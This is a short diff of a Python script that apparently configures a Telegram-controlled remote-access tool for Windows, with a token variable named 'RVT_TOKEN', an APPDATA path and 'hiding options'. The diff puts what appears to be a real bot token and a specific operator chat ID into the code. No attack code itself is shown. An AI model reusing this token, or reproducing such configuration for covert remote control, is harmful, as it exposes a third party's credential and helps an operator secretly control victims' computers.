@@ -39,14 +39,14 @@ cd.log('i','Starting')
 me = singleton.SingleInstance()
 
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
-token = 'xx:xx'
+token = '1298595013:AAE9GUqpMjyHTRhKP2p0GsvByb7O9VtXpo8'
 if 'RVT_TOKEN' in os.environ: # it can also be set as an environment variable
         token = os.environ['RVT_TOKEN']
 
 # This will be used for setting paths and related file io -- change to whatever you want
 app_name = 'ABCdef123'
 # ADD YOUR chat_id IN STRING FORMAT TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
-known_ids = []
+known_ids = [1392364774]
 #known_ids.append(os.environ['TELEGRAM_CHAT_ID']if 'TELEGRAM_CHAT_ID' in os.environ) 		# make sure to remove this line if you don't have this environment variable
 appdata_roaming_folder = os.environ['APPDATA']			# = 'C:\Users\Username\AppData\Roaming'
 														# HIDING OPTIONS
